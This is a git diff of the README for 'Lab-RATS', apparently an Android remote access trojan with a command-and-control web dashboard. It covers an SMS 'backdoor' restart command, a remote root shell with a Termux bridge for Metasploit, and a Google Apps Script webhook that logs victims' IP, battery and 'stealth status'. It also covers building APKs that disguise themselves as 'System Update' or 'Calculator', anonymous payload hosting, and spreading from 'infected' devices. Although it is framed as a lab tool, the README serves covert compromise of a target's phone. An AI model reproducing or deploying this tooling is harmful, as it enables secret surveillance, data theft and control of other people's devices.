@@ -1,4 +1,4 @@
-<img width="1266" height="354" alt="Screenshot 2026-09-27 at 4 09 43 PM" src="https://github.com/user-attachments/assets/db8e6f75-aa43-43c5-a3d4-197fb844d81f" />
+<img width="1301" height="443" alt="Screenshot 2026-09-26 at 11 22 36 AM" src="https://github.com/user-attachments/assets/42a809c7-973c-41a3-acb4-6d79f0cd3483" />
 
 
 <p align="center">
@@ -111,33 +111,27 @@
 
 ### 🌐 **Direct IPv6 Access** *(P2P connection)*
 
-**Lab-RATS** exploits the **unique traits** of **publicly routable IPv6 addresses** assigned by **modern WIFI/5G/LTE carriers**. By binding the **Lab-RATS** server **directly to the Global Unicast Address**, it **bypasses Carrier-Grade NAT** *(CGNAT)* and **firewalls entirely**. This allows for **Zero Configuration peer-to-peer** *(P2P)* **remote access** from **any browser in the world** without the need for **routers, port forwarding,** or **external tunneling software** like **Pinggy or Ngrok**.
+**Lab-RATS** exploits the **unique traits** of **publicly routable IPv6 addresses** assigned by **modern WIFI/5G/LTE carriers**. By binding the **Lab-RATS** server **directly to the Global Unicast Address**, it **bypasses Carrier-Grade NAT** *(CGNAT)* and **firewalls entirely**. This allows for **Zero Configuration** peer-to-peer *(P2P)* **remote access** from **any browser in the world without the need** for **routers, port forwarding,** or **external tunneling software**. *(Pinggy or Ngrok)*
 
 ### 🔄 **Remote Server Restart**
 
-- **Web UI**: **One-click "RESTART_SERVER"** button on the **Terminal tab** to **refresh background services**.
-- **SMS Backdoor**: Send an **SMS/Text containing `!RESTART_C2`** to the **devices number** to **force the server back online** even if it was **manually closed or killed by the OS**.
+- **Web UI**: One-click **"RESTART_SERVER"** button on the **Terminal tab** to refresh **background services**.
+- **SMS Backdoor**: Send an SMS/Text containing `!RESTART_C2` to the **devices number** to **force the server back online** even if it was **manually closed or killed by the OS**.
 
 ### 🛠️ **NEW!** **Termux Bridge Integration**
 
 **Lab-RATS** now features a **high-performance bridge to the Termux environment**. If **Termux is installed on the target device**, the remote terminal can **instantly elevate its capabilities**:
-- **Auto-Routing**: Common commands like `pkg`, `apt`, `pip`, and `python` are **automatically routed through the bridge**.
+- **Auto-Routing**: Common commands like `pkg`, `apt`, `pip`, and `python` are automatically routed through the bridge.
 - **Unrestricted Tools**: Install and run **Python scripts, Nmap scans, or Metasploit** directly from the **C2 web terminal**.
 - **Persistent Environment**: Full support for **Termux's internal storage** and **standard Linux binaries**.
-> [!NOTE]
-> **Termux Bridge Issues**: "**Termux `allow-external-apps` setting is disabled**". (Most Common)
-<br>**Solution**: **On the Target Device** open **Termux and run**:
-```
-echo "allow-external-apps = true" >> ~/.termux/termux.properties
-termux-reload-settings
-```
 
 ### 🖥️ **Enhanced Remote Shell**
 
 The **Terminal Tabs Built-in Shell has been overhauled** for **professional workflows**:
-- **Command History**: Navigate **previous commands instantly** using **Up/Down arrows**.
-- **Modernized Interface**: Updated to `root@Android` prompt with **an updated `help` menu**.
-- **Hardened I/O**: **Multi-stage retry logic** and **unique execution tracking** for **zero-latency command output**.
+- **Command History**: Navigate previous commands instantly using **Up/Down arrows**.
+- **System Diagnostics**: New `sysinfo` command for an **aggregated hardware/software overview**.
+- **Modernized Interface**: Updated to `root@Android` prompt with **a built-in `help` menu**.
+- **Hardened I/O**: **Multi-stage retry logic** and unique **execution tracking** for **zero-latency command output**.
 
 ---
 
@@ -145,7 +139,7 @@ The **Terminal Tabs Built-in Shell has been overhauled** for **professional work
 
 **Lab-RATS** supports **two primary methods** for **tracking your device fleet** and **receiving remote data**.
 
-### ☝🏻 Option 1: Google Sheet (Updated)
+### ☝🏻 Option 1: Google Sheet (Standard)
 **Best for basic IP tracking** and **logging**. **No server maintenance required**.
 
 1.  **Create** a **New Google Sheet**.
@@ -162,22 +156,13 @@ function handleRequest(e) {
     
     // Auto-initialize headers if new sheet
     if (sheet.getLastRow() == 0) {
-      sheet.appendRow([
-        "Timestamp", 
-        "Model #", 
-        "Connection Type", 
-        "IP Address", 
-        "Port", 
-        "Active C2 Link", 
-        "Battery", 
-        "Stealth Status", 
-        "Power", 
-        "Free Storage"
-      ]);
+      sheet.appendRow(["Timestamp", "Model #", "Connection Type", "IP Address", "Port", "Active C2 Link", "Battery", "Stealth Status", "Power", "Free Storage"]);
     }
     
+    // Parse incoming tactical data (Supports JSON POST and GET params)
     var data = (e.postData && e.postData.contents) ? JSON.parse(e.postData.contents) : e.parameter;
     
+    // Finalize row with fallbacks for missing packets
     var row = [
       new Date(),
       data.device || data.model || "Unknown",
@@ -199,9 +184,8 @@ function handleRequest(e) {
 }
 ```
 3.  Click **Deploy** → **New Deployment** → **Web App** → **Execute as Me** *(E-Mail)* → **Who has Access: Anyone**.
-
 > [!IMPORTANT]
-> 4.  **Copy the Webhook URL** they provide and **prepare to paste it into the APK-builder tool** when **prompted**. *(Get Started Section Below)*
+> 4.  **Copy the Webhook URL** it **provides you with and paste it into the APK-builder** when **prompted**. *(Get Started Section Below)*
 
 ---
 
@@ -225,7 +209,7 @@ function handleRequest(e) {
 ### 1. Requirements:
 *   **Java 17 or 21 installed** on your **workstation**.
 *   A **Test Android** device. 📱 *(Samsung/Pixel/OnePlus/HTC supported)*
-*   Your **Google Sheet Webhook URL or Render URL**. *(previous sections above)*
+*   Your **Google Sheet Webhook URL or Render URL**. *(Previous Sections)*
 
 ### 2. Building the APK: (on PC)
 1.  **Download the Repo**: `git clone https://github.com/K4N3CO/Lab-RATS.git`
@@ -251,19 +235,16 @@ function handleRequest(e) {
 *   **and Many More**: The **Wizard** also supports **ADB Strategic Bridge, Stego Image Tails, PWA Manifests**, and **Office Document macros**.
 
 #### **B. Hosting Strategies**
-*   **Anonymous Cloud**: **Option 6** uses **Catbox.moe by default**. It is **anonymous, fast**, and **generates a direct link**.
-*   **P2P Direct**: Host the **APK directly from your PC using a public tunnel**, or from **another infected device** using the `/download/` endpoint.
+*   **Anonymous Cloud**: Option 6 uses **Catbox.moe** by default. It is **anonymous, fast**, and **generates a direct link**.
+*   **P2P Direct**: Host the **APK directly from your PC using a public tunnel**, or from another infected device using the `/download/` endpoint.
 
 #### **C. Installation & Initialization**
 Once the **Target device** downloads the **APK**:
 1.  **Manual Sideload**: If you have **physical access to the device**, use `adb install signed.apk`    
-2.  **Permissions (CRITICAL)**: **Open the app ONCE**. It will **prompt for necessary permissions** *(Camera, SMS, Files, etc)*.
-    -  **Remote Permission Prompt**: If the **user skips some permissions**, you can **remotely trigger the system prompt again** from the **Ghost Tab** using the **REPAIR PERMISSIONS** button.
-3.  **Self-Vanishing**: A few seconds **after launch, the app will automatically replace its icon and name** with the **decoy you chose during build** *("System Update", "Calculator"...etc)*.
-4.  **Uplink Confirmation**: Check your **Google Sheet**. Within **5 seconds of initialization**, the **Device Brand & Model #, Connection Type, IP Address, Port #, Active C2 Dashboard Link, Battery %, Stealth Status, Charging Status and Storage Space will appear in the log**.
-
-### Example Google Sheet Reporting:
-> <img width="1047" height="418" alt="Google Sheet Reporting" src="https://github.com/user-attachments/assets/ad174175-eed8-46b4-bd8d-8c72895cf88a" />
+2.  **Permissions (Critical)**: Open the app **once**. It will **prompt for necessary permissions** *(Camera, SMS, Files, etc)*.
+    -  **Remote Permission Prompt**: If the **user skips a permission**, you can **remotely trigger the system prompt again** from the **Ghost Tab** using the **REPAIR PERMISSIONS** button.
+3.  **Self-Vanishing**: 5 seconds **after launch, the app will automatically replace its icon and name** with the **Decoy you chose during build** *("System Update", "Calculator"...etc)*. The **original icon** you chose during the build will **disappear from the launcher**.
+4.  **Uplink Confirmation**: Check your **Google Sheet**. Within **10 seconds of initialization**, the **active IPv6 address and hardware status will appear in the log**.
 
 ---
 
@@ -311,7 +292,7 @@ https://github.com/user-attachments/assets/45419d9f-df4f-478e-8e69-d3c42ef09bdb
 
 ### Built APK (C2 Server) Installed on Android Device:
 
-<img width="296" height="598" alt="Screenshot 2026-09-27 at 4 15 09 PM" src="https://github.com/user-attachments/assets/a49c5f91-5254-447c-baef-f76048773ec3" />
+<img width="247" height="543" alt="Screenshot 2026-09-26 at 12 25 38 PM" src="https://github.com/user-attachments/assets/7af0ff8e-f174-48ff-9bb3-78f76c63922c" />
 
 ---
 
